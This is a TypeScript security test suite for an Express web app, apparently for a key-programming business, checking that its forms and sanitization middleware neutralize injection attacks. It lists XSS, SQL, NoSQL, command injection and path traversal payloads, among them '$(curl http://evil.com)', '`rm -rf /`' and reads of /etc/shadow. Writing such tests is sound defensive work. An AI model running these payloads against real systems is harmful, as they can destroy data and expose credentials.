import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import express, { Express } from 'express';
import { configureMiddleware } from '../../config/middleware';
import publicRouter from '../../routes/public.routes';
import authRouter from '../../routes/auth.routes';
import { sanitizeInput } from '../../middleware/sanitize';

/**
 * Comprehensive Security Test Suite
 * Tests XSS, SQL Injection, and other injection attack vectors
 */

let app: Express;

beforeAll(() => {
  app = express();
  configureMiddleware(app);
  app.use('/api/public', publicRouter);
  app.use('/api/auth', authRouter);
});

describe('XSS Prevention Tests', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror="alert(\'XSS\')">',
    '<svg/onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<select onfocus=alert("XSS") autofocus>',
    '<textarea onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<IMG SRC="javascript:alert(\'XSS\');">',
    '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
  ];

  it('should sanitize XSS payloads in contact form submission', async () => {
    for (const payload of xssPayloads) {
      const response = await request(app)
        .post('/api/public/contact')
        .send({
          name: payload,
          email: 'test@example.com',
          subject: 'Test',
          message: payload,
        });

      // Should not reject (sanitization should handle it)
      // Verify response doesn't contain unsanitized payload
      if (response.status === 200 || response.status === 201) {
        expect(response.body).toBeDefined();
        // Response should not echo back raw XSS payload
        expect(JSON.stringify(response.body)).not.toContain('<script>');
        expect(JSON.stringify(response.body)).not.toContain('onerror=');
        expect(JSON.stringify(response.body)).not.toContain('javascript:');
      }
    }
  });

  it('should sanitize XSS payloads in quote form submission', async () => {
    const response = await request(app)
      .post('/api/public/quote')
      .send({
        serviceType: 'key_programming',
        brand: '<script>alert("XSS")</script>',
        model: '<img src=x onerror="alert(1)">',
        year: '2020',
        name: 'Test User',
        email: 'test@example.com',
        phone: '1234567890',
        message: '<svg/onload=alert("XSS")>',
      });

    // Verify sanitization occurred
    if (response.status === 200 || response.status === 201) {
      expect(JSON.stringify(response.body)).not.toContain('<script>');
      expect(JSON.stringify(response.body)).not.toContain('onerror=');
      expect(JSON.stringify(response.body)).not.toContain('onload=');
    }
  });

  it('should handle nested XSS payloads in complex objects', async () => {
    const nestedPayload = {
      name: 'Normal Name',
      email: 'test@example.com',
      subject: '<script>alert("nested")</script>',
      message: 'Normal message with <img src=x onerror=alert(1)> embedded',
    };

    const response = await request(app)
      .post('/api/public/contact')
      .send(nestedPayload);

    if (response.status === 200 || response.status === 201) {
      const responseStr = JSON.stringify(response.body);
      expect(responseStr).not.toContain('<script>');
      expect(responseStr).not.toContain('onerror=');
    }
  });

  it('should sanitize XSS in URL parameters', async () => {
    const response = await request(app)
      .get('/api/public/services')
      .query({
        search: '<script>alert("XSS")</script>',
        category: '<img src=x onerror=alert(1)>',
      });

    // Query parameters should be sanitized
    expect(response.status).toBeLessThan(500);
  });
});

describe('SQL Injection Prevention Tests', () => {
  const sqlInjectionPayloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
    "'; DROP TABLE users--",
    "'; DELETE FROM users WHERE 1=1--",
    "1; UPDATE users SET password='hacked'--",
  ];

  it('should reject SQL injection attempts in registration', async () => {
    for (const payload of sqlInjectionPayloads) {
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          email: `test${payload}@example.com`,
          password: 'ValidPassword123!',
          firstName: payload,
          lastName: payload,
        });

      // Should either reject or sanitize
      // Should not cause database errors (500)
      expect(response.status).not.toBe(500);

      // Response should not contain SQL syntax
      if (response.body) {
        const responseStr = JSON.stringify(response.body);
        expect(responseStr).not.toContain('UNION SELECT');
        expect(responseStr).not.toContain('DROP TABLE');
        expect(responseStr).not.toContain('DELETE FROM');
      }
    }
  });

  it('should sanitize SQL injection in contact form', async () => {
    const response = await request(app)
      .post('/api/public/contact')
      .send({
        name: "'; DROP TABLE contacts--",
        email: 'test@example.com',
        subject: "' OR '1'='1",
        message: '1\' UNION SELECT NULL,NULL,NULL,NULL--',
      });

    // Should not cause database errors
    expect(response.status).not.toBe(500);

    // Should sanitize SQL syntax
    if (response.body && response.status < 400) {
      const responseStr = JSON.stringify(response.body);
      expect(responseStr).not.toContain('DROP TABLE');
      expect(responseStr).not.toContain('UNION SELECT');
    }
  });

  it('should sanitize SQL injection in quote form', async () => {
    const response = await request(app)
      .post('/api/public/quote')
      .send({
        serviceType: 'key_programming',
        brand: "'; DELETE FROM quotes--",
        model: "' OR '1'='1",
        year: '2020',
        name: 'Test User',
        email: 'test@example.com',
        phone: '1234567890',
        vin: "1' AND 1=0 UNION ALL SELECT NULL--",
      });

    expect(response.status).not.toBe(500);
  });
});

describe('Input Validation and Length Constraints', () => {
  it('should reject oversized payloads', async () => {
    const oversizedString = 'A'.repeat(100000); // 100KB string

    const response = await request(app)
      .post('/api/public/contact')
      .send({
        name: 'Test User',
        email: 'test@example.com',
        subject: 'Test',
        message: oversizedString,
      });

    // Should reject (either 400 validation error or 403 CSRF/security error)
    expect(response.status).toBeGreaterThanOrEqual(400);
    expect(response.status).toBeLessThan(500);
  });

  it('should reject deeply nested objects (DoS prevention)', async () => {
    // Create deeply nested object
    let nested: any = { value: 'test' };
    for (let i = 0; i < 100; i++) {
      nested = { child: nested };
    }

    const response = await request(app)
      .post('/api/public/contact')
      .send({
        name: 'Test',
        email: 'test@example.com',
        subject: 'Test',
        message: 'Test',
        nested: nested,
      });

    // Should handle gracefully (reject or ignore nested field)
    expect(response.status).not.toBe(500);
  });

  it('should enforce max length on all string fields', async () => {
    const longString = 'A'.repeat(10000);

    const response = await request(app)
      .post('/api/public/quote')
      .send({
        serviceType: longString,
        brand: longString,
        model: longString,
        year: longString,
        name: longString,
        email: 'test@example.com',
        phone: longString,
        message: longString,
      });

    // Should reject (either 400 validation or 403 security error)
    expect(response.status).toBeGreaterThanOrEqual(400);
    expect(response.status).toBeLessThan(500);
  });
});

describe('NoSQL Injection Prevention Tests', () => {
  const noSqlPayloads = [
    { $gt: '' },
    { $ne: null },
    { $regex: '.*' },
    { $where: '1==1' },
    "{ $gt: '' }",
    "{ $ne: null }",
  ];

  it('should sanitize NoSQL injection attempts', async () => {
    for (const payload of noSqlPayloads) {
      const response = await request(app)
        .post('/api/public/contact')
        .send({
          name: typeof payload === 'string' ? payload : JSON.stringify(payload),
          email: 'test@example.com',
          subject: 'Test',
          message: 'Test message',
        });

      // Should not cause errors
      expect(response.status).not.toBe(500);
    }
  });
});

describe('Command Injection Prevention Tests', () => {
  const commandInjectionPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '`rm -rf /`',
    '$(curl http://evil.com)',
    '; cat /etc/shadow',
    '&& ping -c 10 127.0.0.1',
  ];

  it('should sanitize command injection attempts', async () => {
    for (const payload of commandInjectionPayloads) {
      const response = await request(app)
        .post('/api/public/contact')
        .send({
          name: 'Test User',
          email: 'test@example.com',
          subject: payload,
          message: payload,
        });

      // Should not execute commands
      expect(response.status).not.toBe(500);

      if (response.body) {
        const responseStr = JSON.stringify(response.body);
        // Should not contain unescaped shell operators
        expect(responseStr).not.toMatch(/[;&|`$()]/);
      }
    }
  });
});

describe('Path Traversal Prevention Tests', () => {
  const pathTraversalPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '..;/..;/..;/etc/passwd',
  ];

  it('should sanitize path traversal attempts', async () => {
    for (const payload of pathTraversalPayloads) {
      const response = await request(app)
        .post('/api/public/contact')
        .send({
          name: payload,
          email: 'test@example.com',
          subject: 'Test',
          message: payload,
        });

      // Should not cause errors
      expect(response.status).not.toBe(500);

      if (response.body) {
        const responseStr = JSON.stringify(response.body);
        // Should not contain path traversal sequences
        expect(responseStr).not.toContain('../');
        expect(responseStr).not.toContain('..\\');
      }
    }
  });
});

describe('Sanitization Middleware Unit Tests', () => {
  it('should sanitize HTML in request body', () => {
    const mockReq: any = {
      body: {
        name: '<script>alert("XSS")</script>',
        nested: {
          value: '<img src=x onerror=alert(1)>',
        },
      },
      query: {},
      params: {},
    };

    const mockRes: any = {};
    const mockNext = () => {};

    sanitizeInput(mockReq, mockRes, mockNext);

    // Verify HTML tags are escaped (rendered harmless)
    expect(mockReq.body.name).toContain('&lt;');
    expect(mockReq.body.name).toContain('&gt;');
    expect(mockReq.body.name).not.toContain('<script>');
    expect(mockReq.body.nested.value).toContain('&lt;');
    expect(mockReq.body.nested.value).toContain('&gt;');
  });

  it('should sanitize arrays in request body', () => {
    const mockReq: any = {
      body: {
        items: [
          '<script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
        ],
      },
      query: {},
      params: {},
    };

    const mockRes: any = {};
    const mockNext = () => {};

    sanitizeInput(mockReq, mockRes, mockNext);

    // Verify HTML tags are escaped in array items
    expect(mockReq.body.items[0]).toContain('&lt;');
    expect(mockReq.body.items[0]).not.toContain('<script>');
    expect(mockReq.body.items[1]).toContain('&lt;');
    expect(mockReq.body.items[1]).toContain('&gt;');
  });

  it('should handle null and undefined values', () => {
    const mockReq: any = {
      body: {
        name: null,
        email: undefined,
        message: 'test',
      },
      query: {},
      params: {},
    };

    const mockRes: any = {};
    const mockNext = () => {};

    expect(() => sanitizeInput(mockReq, mockRes, mockNext)).not.toThrow();
  });
});
